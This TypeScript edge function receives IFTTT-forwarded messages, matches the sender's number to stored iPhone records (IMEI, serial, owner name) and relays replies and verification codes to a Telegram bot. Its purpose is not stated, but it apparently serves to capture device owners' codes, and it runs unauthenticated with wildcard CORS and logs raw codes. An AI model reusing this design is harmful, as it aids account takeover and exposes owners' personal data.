
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  NotificationTitle?: string;
  NotificationMessage?: string;
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  console.log(`[${new Date().toISOString()}] Received ${req.method} request to telegram-notification`);
  
  if (req.method === 'OPTIONS') {
    console.log('Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Processing notification request...');
    
    let requestData: NotificationData;
    
    try {
      const body = await req.text();
      console.log('Raw request body:', body);
      console.log('Content-Type header:', req.headers.get('content-type'));
      
      if (!body || body.trim() === '') {
        console.log('Empty request body received');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Empty request body',
            message: 'No se recibió contenido en la solicitud'
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 400
          }
        );
      }

      // Try to parse as JSON first
      try {
        requestData = JSON.parse(body);
        console.log('Successfully parsed as JSON:', requestData);
      } catch (jsonError) {
        console.log('Failed to parse as JSON, trying text format...');
        
        // Check if it's the IFTTT format with variables that weren't replaced
        if (body.includes('{{NotificationTitle}}') || body.includes('{{NotificationMessage}}')) {
          console.log('Detected IFTTT template variables that weren\'t replaced');
          return new Response(
            JSON.stringify({ 
              success: false, 
              error: 'IFTTT template error',
              message: 'Las variables de IFTTT no se reemplazaron correctamente. Verifica tu configuración de IFTTT.',
              received_body: body
            }), 
            { 
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 400
            }
          );
        }
        
        // If it's not JSON, treat entire body as message content
        requestData = {
          NotificationTitle: '',
          NotificationMessage: body
        };
        console.log('Parsed as text format:', requestData);
      }
    } catch (parseError) {
      console.error('Error parsing request body:', parseError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid request format',
          message: 'Formato de solicitud inválido. Debe ser JSON o texto plano.',
          details: parseError.message
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('Parsed notification data:', requestData);

    // Extract phone number from NotificationTitle (sender info)
    // Extract message content from NotificationMessage  
    let phoneNumber = '';
    let messageText = '';
    
    // NotificationTitle should contain the sender's phone number
    const senderInfo = requestData.NotificationTitle || '';
    console.log('Sender info from NotificationTitle:', senderInfo);
    
    // NotificationMessage contains the actual message content
    messageText = requestData.NotificationMessage || requestData.message || '';
    console.log('Message content from NotificationMessage:', messageText);
    
    // Extract phone number from sender info
    phoneNumber = extractPhoneNumber(senderInfo);
    console.log('Extracted phone number:', phoneNumber);

    // If no valid phone number found, return error
    if (!phoneNumber || phoneNumber.length < 4) {
      console.log('No valid phone number found in NotificationTitle');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'No phone number found',
          message: 'No se encontró un número de teléfono válido en NotificationTitle',
          received_data: requestData,
          sender_info: senderInfo
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    console.log('Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Clean and normalize phone number for search
    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
    console.log('Searching for process with phone number:', cleanPhoneNumber);

    // Enhanced search patterns
    const searchPatterns = [
      cleanPhoneNumber,
      phoneNumber,
      cleanPhoneNumber.startsWith('+') ? cleanPhoneNumber : `+${cleanPhoneNumber}`,
      cleanPhoneNumber.replace('+', ''),
      // For different country codes, try without them
      cleanPhoneNumber.replace(/^\+\d{1,4}/, ''),
      // Try with common variations
      cleanPhoneNumber.replace(/^\+/, ''),
      // Extract just the local number part (last 7-10 digits)
      cleanPhoneNumber.slice(-10),
      cleanPhoneNumber.slice(-9),
      cleanPhoneNumber.slice(-8),
      cleanPhoneNumber.slice(-7),
    ];

    // Remove duplicates and empty patterns
    const uniquePatterns = [...new Set(searchPatterns)].filter(p => p && p.length > 0);
    
    console.log('Trying search patterns:', uniquePatterns);

    let matchedProcess = null;
    let matchedPattern = '';

    // Search for the process
    for (const pattern of uniquePatterns) {
      console.log(`Searching with pattern: "${pattern}"`);
      
      // Search in phone_number field
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .eq('phone_number', pattern)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(1);

      if (queryError) {
        console.error('Database query error for pattern', pattern, ':', queryError);
        continue;
      }

      console.log(`Found ${processes?.length || 0} matching processes for phone_number pattern:`, pattern);

      if (processes && processes.length > 0) {
        matchedProcess = processes[0];
        matchedPattern = pattern;
        console.log('Match found with phone_number pattern:', pattern);
        break;
      }

      // Also try searching by combining country_code + phone_number
      console.log(`Searching for pattern "${pattern}" in combined country_code + phone_number`);
      
      const { data: combinedProcesses, error: combinedError } = await supabase
        .from('processes')
        .select(`
          id,
          user_id,
          client_name,
          iphone_model,
          imei,
          serial_number,
          owner_name,
          country_code,
          phone_number,
          profiles!inner(telegram_bot_token, telegram_chat_id)
        `)
        .not('profiles.telegram_bot_token', 'is', null)
        .not('profiles.telegram_chat_id', 'is', null)
        .limit(10);

      if (!combinedError && combinedProcesses) {
        for (const proc of combinedProcesses) {
          const fullNumber = `${proc.country_code}${proc.phone_number}`;
          const fullNumberClean = fullNumber.replace(/[\s\-\(\)]/g, '');
          
          if (fullNumberClean === pattern || 
              fullNumberClean === pattern.replace('+', '') ||
              fullNumber === pattern ||
              proc.phone_number === pattern) {
            matchedProcess = proc;
            matchedPattern = pattern;
            console.log('Match found with combined pattern:', pattern, 'matching:', fullNumber);
            break;
          }
        }
        
        if (matchedProcess) break;
      }
    }

    if (!matchedProcess) {
      console.log('No matching process found for any pattern');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: `No se encontró un proceso con el número de teléfono: ${cleanPhoneNumber}`,
          phone_searched: cleanPhoneNumber,
          patterns_tried: uniquePatterns,
          sender_info: senderInfo
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    const process = matchedProcess;
    const profile = process.profiles;

    console.log('Found process:', process.id, 'for user:', process.user_id, 'with pattern:', matchedPattern);

    if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
      console.log('User has not configured Telegram bot');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Telegram not configured',
          message: 'El usuario no ha configurado su bot de Telegram'
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // Enhanced message text handling for verification codes
    const displayMessage = messageText || 'Mensaje sin contenido';
    const isVerificationCode = /^\d{4,6}$/.test(messageText.trim());
    const messageType = isVerificationCode ? '🔐 CÓDIGO DE VERIFICACIÓN' : '📥 Respuesta o código';

    console.log('Message analysis:', {
      messageText,
      displayMessage,
      isVerificationCode,
      messageType
    });

    const notificationMessage = `🔔 Alerta de proceso de WhatsApp

👩🏽‍💻 Servidor Astro

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📞 IMEI: ${process.imei}
🔢 Serie: ${process.serial_number}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber}
${messageType}: ${displayMessage}

🤖 Bot Astro en línea 🟢`;

    console.log('Sending notification to Telegram...');
    
    const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: profile.telegram_chat_id,
        text: notificationMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Failed to send Telegram message',
          details: telegramResult
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log('Notification sent successfully to user:', process.user_id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        phone_number: cleanPhoneNumber,
        matched_pattern: matchedPattern,
        message_content: messageText,
        is_verification_code: isVerificationCode
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (error) {
    console.error('Error processing notification:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});

// Function to extract phone number from sender info (NotificationTitle)
function extractPhoneNumber(senderInfo: string): string {
  if (!senderInfo) return '';
  
  console.log('Extracting phone number from sender info:', senderInfo);
  
  // Phone number patterns for international formats
  const phonePatterns = [
    // International format with + and country code
    /(\+\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4})/g,
    // Without + but with country code
    /(\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4}[\s\-]?\d{1,4})/g,
    // Just digits (7-15 characters)
    /(\d{7,15})/g,
  ];
  
  let phoneNumber = '';
  
  // Try each pattern
  for (const pattern of phonePatterns) {
    const matches = senderInfo.match(pattern);
    if (matches) {
      // Look for the longest reasonable match
      for (const match of matches) {
        const cleanMatch = match.replace(/[\s\-]/g, '');
        // Check if it's a reasonable phone number length (7-15 digits)
        if (cleanMatch.length >= 7 && cleanMatch.length <= 15) {
          phoneNumber = match;
          console.log('Phone number found with pattern:', phoneNumber);
          break;
        }
      }
      if (phoneNumber) break;
    }
  }
  
  // If no phone found with patterns, try to extract from different positions
  if (!phoneNumber) {
    // Split by spaces and look for phone-like sequences
    const parts = senderInfo.split(/\s+/);
    
    for (let i = 0; i < parts.length; i++) {
      // Try 1-3 consecutive parts as potential phone number
      for (let j = 1; j <= Math.min(3, parts.length - i); j++) {
        const candidate = parts.slice(i, i + j).join(' ');
        const cleanCandidate = candidate.replace(/[\s\-\(\)]/g, '');
        
        // Check if this looks like a phone number
        if (cleanCandidate.match(/^\+?\d{7,15}$/)) {
          phoneNumber = candidate;
          console.log('Phone found in parts:', phoneNumber);
          break;
        }
      }
      if (phoneNumber) break;
    }
  }
  
  // Normalize phone number - add + if missing and it looks international
  if (phoneNumber) {
    const cleanPhone = phoneNumber.replace(/[\s\-\(\)]/g, '');
    if (!cleanPhone.startsWith('+') && cleanPhone.length >= 10) {
      phoneNumber = '+' + cleanPhone;
    }
  }
  
  console.log('Final extracted phone number:', phoneNumber);
  
  return phoneNumber;
}
